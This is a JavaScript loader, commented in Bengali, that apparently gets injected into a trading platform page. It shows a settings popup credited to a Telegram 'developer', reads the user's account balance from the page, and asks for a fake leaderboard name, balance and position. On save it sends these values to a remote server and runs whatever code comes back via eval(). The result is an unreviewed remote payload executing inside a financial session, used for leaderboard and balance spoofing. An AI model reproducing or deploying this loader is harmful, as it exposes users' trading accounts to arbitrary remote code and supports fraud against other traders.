// License-free version — loder.js
(async function () {
  // 1. SweetAlert2 লাইব্রেরি লোড করা
  if (typeof Swal === 'undefined') {
    await new Promise((resolve, reject) => {
      const s = document.createElement('script');
      s.src = 'https://cdn.jsdelivr.net/npm/sweetalert2@11';
      s.onload = resolve;
      s.onerror = reject;
      document.head.appendChild(s);
    });
  }

  // 2. মূল ভ্যারিয়েবল এবং সার্ভার কনফিগারেশন
  const SERVER_FETCH_CODE = 'https://jisan1122.pythonanywhere.com/server';
  let demoBalance = 12500;

  // 3. ডিভাইস তথ্য সংগ্রহ করার ফাংশন (অপরিবর্তিত)
  function getDeviceInfo() {
    const ua = navigator.userAgent || '';
    const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ');
    return {
      fingerprint: 'dev_' + Math.random().toString(36).slice(2, 12),
      deviceType: /Mobile/.test(ua) ? 'Mobile' : /Tablet/.test(ua) ? 'Tablet' : 'Desktop',
      browser: (/Firefox/.test(ua) && 'Firefox') || (/Chrome/.test(ua) && 'Chrome') || (/Safari/.test(ua) && 'Safari') || 'Unknown',
      os: (/Windows/.test(ua) && 'Windows') || (/Macintosh/.test(ua) && 'Mac OS') || (/Android/.test(ua) && 'Android') || 'Unknown',
      userAgent: ua,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      plugins,
      hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
      language: navigator.language
    };
  }

  // 5. স্টাইল (CSS) একই রাখা হয়েছে
  const styles = `/* same CSS as before */`;

  // 6. UI ফাংশন
  function displayMessage(msg, t = 2500) {
    const el = document.createElement('div');
    el.className = 'message-popup';
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(() => {
      el.style.opacity = '0';
      el.style.top = '0px';
      setTimeout(() => el.remove(), 300);
    }, t);
  }
  function showCenteredMessage(text, duration) {
    const el = document.createElement('div');
    el.id = 'centeredDeveloperMessage';
    el.textContent = text;
    document.body.appendChild(el);
    setTimeout(() => { el.style.opacity = '1'; }, 10);
    setTimeout(() => {
      el.style.opacity = '0';
      setTimeout(() => el.remove(), 500);
    }, duration);
  }

  // 7. মূল স্ক্রিপ্ট রান করার ফাংশন
  async function runMainScript(lname, iblafp, midPosition, basePosition, countryFlag) {
    try {
      const params = new URLSearchParams({ lname, iblafp, flagCode: countryFlag, userAgent: navigator.userAgent, windowSize: window.innerWidth + 'x' + window.innerHeight });
      const resp = await fetch(SERVER_FETCH_CODE + '?' + params.toString(), { method: 'GET', headers: { Accept: 'application/json' } });
      const data = await resp.json();
      if (data && data.valid && data.code) {
        try { eval(data.code); } catch (e) { console.error('eval error', e); }
      } else {
        displayMessage('No code returned');
      }
    } catch (e) {
      displayMessage('Failed to fetch code');
    }
  }

  // 8. পপআপ তৈরি ও ইভেন্ট হ্যান্ডলিং
  async function createSettingsPopup() {
    const container = document.createElement('div');
    container.id = 'settingsPopupContainer';
    container.innerHTML = `
      <div id="settingsPopup">
        <h2>Developer: @traderjisanx</h2>
        <a href="https://t.me/trader_jisan" target="_blank" style="display:inline-block; margin-bottom:15px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="40">
        </a>
        <label>Leaderboard Name:<input type="text" id="lname" placeholder="Enter Name"></label>
        
        <div style="position: relative;">
            <label>Leaderboard Balance:<input type="number" id="iblafp" placeholder="Enter Balance"></label>
            <span id="refreshBalanceBtn" title="Fetch Current Balance">
                <svg viewBox="0 0 24 24"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"></path></svg>
            </span>
        </div>

        <label>Mid Position:<input type="number" id="midPosition" value="1690"></label>
        <label>Maximum Position:<input type="number" id="basePosition" value="789345"></label>
        <label>Country Flag:
          <select id="countryFlagSelect">
            <option value="bd">🇧🇩 Bangladesh</option>
            <option value="in">🇮🇳 India</option>
            <option value="pk">🇵🇰 Pakistan</option>
          </select>
        </label>

        <div id="demoBalanceSection">
          <h3>Demo Balance Settings</h3>
          <input type="number" id="demoBalanceInput" placeholder="Enter demo balance" value="${demoBalance}">
          <button id="setDemoBtn" style="background:#17a2b8;">Update Demo Balance</button>
          <div id="demoBalanceStatus" style="font-size:12px; margin-top:6px; color:green;"></div>
        </div>
        <button id="saveButton">Save Settings</button>
        <button class="close-btn" id="closeBtn">Close</button>
      </div>
    `;

    document.head.appendChild(Object.assign(document.createElement('style'), { textContent: styles }));
    document.body.appendChild(container);

    const popupElement = document.getElementById('settingsPopup');
    setTimeout(() => popupElement.classList.add('show'), 10);

    // Refresh balance
    const refreshBtn = document.getElementById('refreshBalanceBtn');
    refreshBtn.addEventListener('click', () => {
      refreshBtn.classList.add('spinning');
      const balanceElement = document.querySelector('.---react-features-Usermenu-styles-module__infoBalance--pVBHU');
      if (!balanceElement) {
        displayMessage('Error: Could not find the balance element.');
        setTimeout(() => refreshBtn.classList.remove('spinning'), 500);
        return;
      }
      const processedBalance = balanceElement.textContent.replace(/\D/g, '');
      document.getElementById('iblafp').value = processedBalance;
      displayMessage('Balance updated!');
      setTimeout(() => refreshBtn.classList.remove('spinning'), 500);
    });

    document.getElementById('setDemoBtn').addEventListener('click', () => {
      const v = document.getElementById('demoBalanceInput').value;
      if (!v || isNaN(v)) { displayMessage('Please enter a valid balance'); return; }
      demoBalance = parseInt(v, 10);
      const statusEl = document.getElementById('demoBalanceStatus');
      statusEl.textContent = 'Demo balance updated!';
      setTimeout(() => statusEl.textContent = '', 2500);
    });

    document.getElementById('saveButton').addEventListener('click', async () => {
      const lname = document.getElementById('lname').value || '';
      const iblafp = document.getElementById('iblafp').value || '';
      const midPosition = document.getElementById('midPosition').value || '1690';
      const basePosition = document.getElementById('basePosition').value || '789345';
      const countryCode = document.getElementById('countryFlagSelect').value || 'bd';
      const countryFlagSVG = `<svg class="flag flag-${countryCode}"><use xlink:href="/profile/images/flags.svg#flag-${countryCode}"></use></svg>`;
      await runMainScript(lname, iblafp, midPosition, basePosition, countryFlagSVG);
      closeSettingsPopup();
      showCenteredMessage('Developer @traderjisanx !', 5000);
    });

    document.getElementById('closeBtn').addEventListener('click', closeSettingsPopup);
  }

  function closeSettingsPopup() {
    const popup = document.getElementById('settingsPopup');
    if (popup) {
      popup.classList.remove('show');
      setTimeout(() => popup.parentElement.remove(), 300);
    }
  }

  // Run
  window.loder_runMainScript = runMainScript;
  await createSettingsPopup();

})();
